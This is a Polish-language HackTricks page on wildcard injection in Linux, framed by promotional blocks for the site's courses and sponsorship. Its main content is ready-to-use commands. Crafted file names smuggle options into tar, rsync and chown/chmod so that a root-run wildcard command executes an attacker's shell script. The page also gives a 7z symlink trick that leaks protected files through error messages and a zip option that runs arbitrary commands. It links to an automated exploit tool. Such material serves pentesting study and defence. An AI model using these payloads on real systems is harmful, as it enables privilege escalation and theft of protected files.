<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>


## chown, chmod

Możesz **wskazać, którego właściciela pliku i uprawnienia chcesz skopiować dla pozostałych plików**
```bash
touch "--reference=/my/own/path/filename"
```
Możesz to wykorzystać za pomocą [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinowany atak)_\
Więcej informacji na stronie [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Wykonaj dowolne polecenia:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Możesz to wykorzystać za pomocą [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(atak tar)_\
Więcej informacji na stronie [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Wykonaj dowolne polecenia:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Możesz to wykorzystać za pomocą [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(atak rsync)_\
Więcej informacji na stronie [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

W **7z** nawet używając `--` przed `*` (zauważ, że `--` oznacza, że następne dane wejściowe nie mogą być traktowane jako parametry, więc w tym przypadku tylko ścieżki plików) możesz spowodować dowolny błąd, aby odczytać plik, więc jeśli polecenie takie jak poniższe jest wykonywane przez użytkownika root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
I możesz tworzyć pliki w folderze, w którym jest wykonywane polecenie. Możesz utworzyć plik `@root.txt` oraz plik `root.txt`, który będzie **symlinkiem** do pliku, który chcesz odczytać:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Następnie, gdy **7z** jest uruchamiany, potraktuje `root.txt` jako plik zawierający listę plików, które powinien skompresować (o czym świadczy istnienie `@root.txt`), a gdy 7z odczytuje `root.txt`, odczyta `/file/you/want/to/read` i **ponieważ zawartość tego pliku nie jest listą plików, wyświetli błąd** pokazujący zawartość.

_Więcej informacji w Write-upach z CTF z HackTheBox._

## Zip

**Wykonaj dowolne polecenia:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
